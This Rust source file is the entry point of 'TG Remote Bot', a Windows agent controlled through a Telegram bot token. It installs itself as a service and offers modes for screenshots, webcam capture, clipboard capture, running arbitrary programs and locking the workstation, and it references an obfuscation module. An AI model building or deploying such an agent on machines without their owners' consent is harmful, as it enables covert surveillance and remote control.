use std::env;
use std::sync::mpsc;
use std::thread;

use anyhow::Result;

mod bot;
mod commands;
mod machine;
mod security;
mod service;
mod updater;

fn check_already_running() -> Result<()> {
    let mutex_name = std::ffi::CString::new("Global\\TgRemoteAgent_Mutex")
        .map_err(|_| anyhow::anyhow!("invalid mutex name"))?;
    let handle = unsafe {
        windows_sys::Win32::System::Threading::CreateMutexA(
            std::ptr::null(),
            true as i32,
            mutex_name.as_ptr() as *const u8,
        )
    };
    if handle.is_null() {
        anyhow::bail!("Không thể tạo mutex");
    }
    let err = unsafe { windows_sys::Win32::Foundation::GetLastError() };
    if err == 183 {
        anyhow::bail!("Bot đang chạy trên máy này rồi. Chỉ chạy 1 instance tại một thời điểm.");
    }
    Ok(())
}

fn is_admin() -> bool {
    let hklm = winreg::RegKey::predef(winreg::enums::HKEY_LOCAL_MACHINE);
    hklm.open_subkey_with_flags(
        r"SOFTWARE\Microsoft\Windows\CurrentVersion",
        winreg::enums::KEY_WRITE,
    )
    .is_ok()
}

fn init_foreground_logger() {
    if let Err(e) = service::logging::init_logger(
        security::obfuscation::install_home(),
        service::logging::LogMode::Foreground,
    ) {
        eprintln!("Cannot init logger: {e:?}");
    }
}

fn main() -> Result<()> {
    let args: Vec<String> = env::args().collect();

    match args.get(1).map(|s| s.as_str()) {
        Some("--run") => {
            if args.len() < 4 {
                anyhow::bail!("Usage: --run TOKEN UID");
            }
            service::logging::init_logger(
                std::path::Path::new("."),
                service::logging::LogMode::Foreground,
            )
            .ok();
            check_already_running()?;
            service::install::cleanup_old_files();
            let token = args[2].clone();
            let uid: i64 = args[3].parse()?;
            let cfg = service::config::AppConfig {
                bot_token: token,
                super_user_id: uid,
            };
            let (tx, rx) = mpsc::channel();
            thread::spawn(move || {
                let _keep = tx;
                thread::park();
            });
            let rt = tokio::runtime::Runtime::new()?;
            rt.block_on(bot::run_until(rx, cfg))
        }
        Some("--install") => {
            if !is_admin() {
                anyhow::bail!(
                    "--install cần quyền Administrator. Hãy chạy cmd với Run as administrator."
                );
            }
            if args.len() < 4 {
                anyhow::bail!("Usage: --install TOKEN UID");
            }
            init_foreground_logger();
            check_already_running()?;
            let token = &args[2];
            let uid: i64 = args[3].parse()?;
            service::install::install(token, uid)?;
            Ok(())
        }
        Some("--reinstall") => {
            if args.len() < 4 {
                anyhow::bail!("Usage: --reinstall TOKEN UID");
            }
            init_foreground_logger();
            let token = &args[2];
            let uid: i64 = args[3].parse()?;
            service::config::save_to_registry(token, uid)?;
            log::info!("Registry updated");
            Ok(())
        }
        Some("--screenshot") => {
            if let Some(path) = args.get(2) {
                commands::screenshot::capture_to_file(path)?;
            }
            Ok(())
        }
        Some("--msgbox") => {
            let text = args.get(2).map(|s| s.as_str()).unwrap_or("");
            commands::msgbox::show_blocking(text);
            Ok(())
        }
        Some("--clipboard") => {
            commands::clipboard::capture_clipboard()?;
            Ok(())
        }
        Some("--camera") => {
            if let Some(path) = args.get(2) {
                commands::camera::capture_to_file(path)?;
            }
            Ok(())
        }
        Some("--lock") => {
            commands::system::lock_workstation();
            Ok(())
        }
        Some("--wallpaper") => {
            commands::wallpaper::print_wallpaper_path();
            Ok(())
        }
        Some("--audio") => {
            let action = args.get(2).map(|s| s.as_str()).unwrap_or("");
            match action {
                "mute" => commands::audio::do_mute(),
                "unmute" => commands::audio::do_unmute(),
                "set" => {
                    let level: u8 = args.get(3).and_then(|s| s.parse().ok()).unwrap_or(50);
                    commands::audio::do_set_volume(level)
                }
                _ => Ok(()),
            }?;
            Ok(())
        }
        Some("--run-program") => {
            if let Some(path) = args.get(2) {
                let _ = std::process::Command::new(path).spawn();
            }
            Ok(())
        }
        Some("--uninstall") => {
            init_foreground_logger();
            service::install::uninstall()?;
            Ok(())
        }
        Some("--help") | Some("-h") => {
            println!("TG Remote Bot v{}", env!("CARGO_PKG_VERSION"));
            println!();
            println!("Usage:");
            println!("  --run TOKEN UID          Run bot in foreground (debug)");
            println!("  --install TOKEN UID      Install as Windows Service (admin required)");
            println!("  --reinstall TOKEN UID    Update registry config");
            println!("  --uninstall              Remove Windows Service");
            println!("  --help                   Show this help");
            Ok(())
        }
        _ => service::windows_svc::dispatch(),
    }
}
